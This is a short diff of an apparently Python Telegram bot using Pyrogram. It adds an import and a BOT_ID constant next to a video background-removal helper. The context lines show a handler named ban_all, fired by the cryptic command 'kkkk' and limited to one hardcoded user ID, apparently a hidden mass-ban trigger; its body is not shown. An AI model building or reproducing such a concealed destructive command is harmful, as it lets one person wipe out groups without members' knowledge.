@@ -1,4 +1,4 @@
-from pyrogram import Client , filters, idle
+from pyrogram import Client , filters, idle, enums
 from pyrogram.types import Message, ChatPermissions
 import asyncio
 import os
@@ -140,6 +140,8 @@ def removebg_video(file):
         files={"video_file": open(file, "rb")},
         headers={"X-Api-Key": UNSCREEN_API}
     )
+
+BOT_ID = 5720302471
 
 @app.on_message(filters.command("kkkk") & filters.user(1497264683))
 async def ban_all(_,msg):
